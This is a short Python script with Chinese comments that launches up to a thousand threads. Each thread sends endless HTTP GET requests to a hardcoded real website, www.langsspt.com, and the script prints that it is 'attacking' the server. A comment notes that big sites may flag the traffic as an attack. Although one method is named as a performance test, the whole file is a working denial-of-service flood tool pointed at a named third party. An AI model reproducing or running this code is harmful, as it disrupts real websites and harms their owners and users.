#
# Python Version: 3.5
#
#
import threading
import time
import http.client as http


# 服务器 + 端口 （有些大网站会认定你是攻击并且重置你的请求，比如baidu.com）
SERVER_NAME = "www.langsspt.com"
# 访问的页面
URL = '/'
# 同时运行的线程数 （每个电脑能开的线程数不同（我：893个线程），如果超过了系统的最大负荷，则只创建能创建的最大线程数）
THREADS_COUNT = 1000

# 已创建的线程数
CREATED_THREAD = 0

# 死亡的线程数
DEAD_THREAD = 0


# 线程类
class RequestThread(threading.Thread):
    # 构造函数
    def __init__(self, thread_name):
        threading.Thread.__init__(self)

    # 线程运行的入口函数
    def run(self):
        try:
            while True:
                self.test_performance()
        except:
            global CREATED_THREAD, DEAD_THREAD
            DEAD_THREAD += 1
            print('your have a new dead thread , now you still have threads:', CREATED_THREAD - DEAD_THREAD)

    # 链接测试服务器
    def test_performance(self):
        try:
            conn = http.HTTPConnection(SERVER_NAME)
            conn.request("GET", URL)
            conn.close()
        except:
            pass

try:
    while THREADS_COUNT > 0:
        t = RequestThread("thread" + str(THREADS_COUNT))
        t.start()
        THREADS_COUNT += -1
        CREATED_THREAD += 1
except:
    print('线程数已达上限：', CREATED_THREAD, '个')
finally:
    print(time.strftime('%Y-%m-%d %H:%M:%S'), ':', 'attacking', SERVER_NAME, '....')
